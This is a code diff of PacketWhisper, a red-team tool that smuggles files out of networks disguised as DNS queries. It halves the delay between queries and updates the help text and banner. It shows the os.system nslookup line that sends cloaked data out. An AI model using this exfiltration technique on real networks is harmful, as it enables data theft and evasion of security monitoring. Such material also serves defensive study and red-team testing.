@@ -57,7 +57,7 @@
 #   $ python packetWhisper.py 
 # 
 
-import os, sys, getopt, socket, re, random, datetime, cloakify, decloakify
+import os, sys, getopt, socket, re, random, datetime, time, cloakify, decloakify
 
 # Set name of knock sequence string (this is only used when transmitting Common FQDN ciphers)
 
@@ -500,7 +500,7 @@ def TransferCloakedFile( cloakedFile ):
 # structured, I can get it running on a limited shell host just by 
 # tar'ing up the project and extracting on the target host.
 #
-# Adds a 1 second delay between DNS queries to help address UDP out-of-order
+# Adds a half-second delay between DNS queries to help address UDP out-of-order
 # delivery race conditions, etc.
 #
 #========================================================================
@@ -525,10 +525,10 @@ def GenerateDNSQueries( cloakedFile ):
 				commandStr = "nslookup " + fqdnStr + " >/dev/null 2>&1"
 				os.system( commandStr )
 
-				os.system( "sleep 1" )
+				time.sleep( 0.500 )   # 0.5 second delay between DNS queries
 		
 			except:
-				os.system( "sleep 1" )
+				time.sleep( 0.500 )   # 0.5 second delay between DNS queries
 
 
 			checkpoint = byteCount % 25
@@ -718,7 +718,6 @@ def ExtractCapturedPayload():
 
 	cipherFilePath = SelectCipherForExtraction()
 
-	print ""
 	print "Extracting payload from PCAP using cipher:", cipherFilePath
 	print ""
 
@@ -1076,10 +1075,9 @@ def Help():
 	print "Not a high-bandwidth transfer method. PacketWhisper relies on DNS queries,"
 	print "which are UDP-based, meaning order of delivery (or even successful delivery)"
 	print "of the request is not guranteed. For this reason, PacketWhisper adds a small"
-	print "(1 second or less) delay between each DNS query. You can safely transfer"
-	print "payloads at a rate of about 3.6K per hour (60 bytes per minute). That's based"
-	print "on the size of the original payload, not the Cloakified output file. You can"
-	print "double that rate of transfer by cutting the delay in half, but proceed carefully."
+	print "(half-second or less) delay between each DNS query. You can safely transfer"
+	print "payloads at a rate of about 7.2K per hour (120 bytes per minute). That's based"
+	print "on the size of the original payload, not the Cloakified output file."
 	print ""
 	print "If you have other datapaths available (HTTP outbound, etc.) then just use"
 	print "the Cloakify project (GitHub project URL above) and its standard ciphers,"
@@ -1132,9 +1130,9 @@ def PrintBanner():
 	print "         \           https://github.com/TryCatchHCF"
 	print "  (\~---."
 	print "  /   (\-`-/)"
-	print " (      ' '  )        data.xls accounts.txt  \\     Series of "
+	print " (      ' '  )        data.xls accounts.txt \\     Series of "
 	print "  \ (  \_Y_/\\        device.cfg  backup.zip  -->  harmless-looking "
-	print "   \"\"\ \___//         LoadMe.war file.doc  /     DNS queries "
+	print "   \"\"\ \___//         LoadMe.war file.doc   /     DNS queries "
 	print "      `w   \""   
 
 	return
